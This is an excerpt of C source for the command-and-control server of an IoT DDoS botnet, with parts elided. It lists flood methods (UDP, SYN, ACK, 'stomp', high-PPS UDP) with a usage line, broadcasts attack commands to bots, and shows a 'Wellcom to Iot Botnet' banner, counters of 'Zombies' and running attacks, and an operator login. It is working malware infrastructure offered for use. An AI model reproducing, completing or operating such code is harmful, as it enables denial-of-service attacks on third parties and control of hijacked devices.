...
char *user_commands[USER_COMMANDS][2] = {
    {"\x1b[1;37mMethod\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.udp      \x1b[0;36m> \x1b[38;5;123mUdp flood with less options\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.syn          \x1b[0;36m> \x1b[38;5;123mTCP syn flood\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.ack          \x1b[0;36m> \x1b[38;5;123mTCP ack flood\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.null         \x1b[0;36m> \x1b[38;5;123mTCP flood with hex data\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.stomp        \x1b[0;36m> \x1b[38;5;123mTCP 3-way handshake can circumvent most protections\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.tcp          \x1b[0;36m> \x1b[38;5;123mReal TCP Protocol Flood\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.stdhex       \x1b[0;36m> \x1b[38;5;123mStandard socket flood with hex data\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.syndata      \x1b[0;36m> \x1b[38;5;123mTCP syn flood with len data\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.sack         \x1b[0;36m> \x1b[38;5;123mACK socket\r\n"},
    {" \x1b[0;37m● \x1b[1;37m.pps          \x1b[0;36m> \x1b[38;5;123mUDP FLOOD OPTIMIZED FOR HIGHER PP/S\r\n"},
    {"\x1b[38;5;205mExample: .stdhex [ip] [time] dport=[port]\r\n"},
};
...
int broadcast_command(char *sendbuf, int maxcount, int maxtime, int myfd, char *floods, char *user, int admin_mode)
{
    ...
    else
    {
        ...
        sprintf(prompt, "\x1b[38;5;57mAttack command sent to %d bots \x1b[1;37m(Started at %s)\r\n", sentto, ts);
...
void sendbanner(int myfd)
{
    ...
    sprintf(line2, "\n");
    sprintf(line3, "\n");
    sprintf(line4, "\x1b[31;2;0;31;168m          ,M\x1b[31;1;0;31;1mMM\x1b[1;37m8&&&.                  \n");
    sprintf(line5, "\x1b[31;2;0;31;168m     _...MM\x1b[31;1;0;31;1mMMM\x1b[1;37m88&&&&..._             \n");
    sprintf(line6, "\x1b[31;2;0;31;168m  .::'''MM\x1b[31;1;0;31;1mMMM\x1b[1;37m88&&&&&&'''::.          \n");
    sprintf(line7, "\x1b[31;2;0;31;168m ::     MM\x1b[31;1;0;31;1mMMM\x1b[1;37m88&&&&&&     ::         \n");
    sprintf(line8, "\x1b[31;2;0;31;168m '::....MM\x1b[31;1;0;31;1mMMM\x1b[1;37m88&&&&&&....::'         \n");
    sprintf(line9, "\x1b[31;2;0;31;168m    `''''MM\x1b[31;1;0;31;1mMMM\x1b[1;37m88&&&&''''`            \n");
    sprintf(line10, "\x1b[31;2;0;31;168m          'M\x1b[31;1;0;31;1mMM\x1b[1;37m8&&&'                  \n");
    sprintf(line11, "\x1b[31;2;0;31;168mWellcom to Iot Botnet\r\n\r\n");
    ...
    send(myfd, line10, strlen(line10), MSG_NOSIGNAL);
    send(myfd, line11, strlen(line11), MSG_NOSIGNAL);
    return;
}
...
void *tab_title_admin(void *arg)
{
    ...
    for(i = 0; i < MAXFDS; i++)
    {
        ...
        sprintf(title, "\033]0;[IoT] | Zombies: [%d] | User_active: [%d] | Running: [%d/%d]\007", botcount, usercount, attkcount, MAX_ATTACKS);
...
void *tab_title_user(void *arg)
{
    ...
    for(i = 0; i < MAXFDS; i++)
    {
        ...
        sprintf(title, "\033]0;[IoT] | Zombies: [%d] | Running: [%d/%d]\007", botcount, attkcount, MAX_ATTACKS);
...
void *controller_thread(void *arg)
{
    ...
    write(accinfo[cfd].fd, "\x1b[0;31mUsername\x1b[1;37m : ", strlen("\x1b[0;31mUsername\x1b[1;37m : "));
    read(accinfo[cfd].fd, username, sizeof(username));
    write(accinfo[cfd].fd, "\x1b[0;31mPassword\x1b[1;37m : ", strlen("\x1b[0;31mPassword\x1b[1;37m : "));
    ...
    for(x = 0; x < MAXFDS; x++)
    {
        ...
        if (accinfo[cfd].admin == 1)
            sprintf(prompt, "\x1b[0;37m%s\x1b[38;5;197m@IoT\033[0m# ", username);
        else
            sprintf(prompt, "\x1b[0;37m%s\x1b[38;5;197m@IoT\033[0m# ", username);
